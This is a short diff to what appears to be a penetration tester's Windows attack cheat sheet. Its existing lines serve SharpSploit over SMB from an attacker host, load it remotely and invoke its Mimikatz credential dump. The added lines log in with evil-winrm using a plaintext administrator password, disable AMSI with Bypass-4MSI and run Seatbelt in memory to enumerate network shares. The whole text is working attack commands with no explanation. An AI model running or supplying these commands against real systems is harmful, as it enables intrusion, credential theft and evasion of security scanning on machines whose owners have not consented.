@@ -37,4 +37,8 @@ smbserver.py -comment 'DLL' -smb2support test /root/Desktop/tools/SharpSploit
 Dll-Loader -smb -path \\10.10.0.2\test\SharpSploit.dll
 [SharpSploit.Credentials.Mimikatz]::All()
 
+evil-winrm.rb -u administrator -p abcd_123321 -i 10.4.30.56 -e /root/Desktop/tools/seatbelt/
+Bypass-4MSI
+Invoke-Binary /root/Desktop/tools/seatbelt/Seatbelt.exe networkshares
+
 
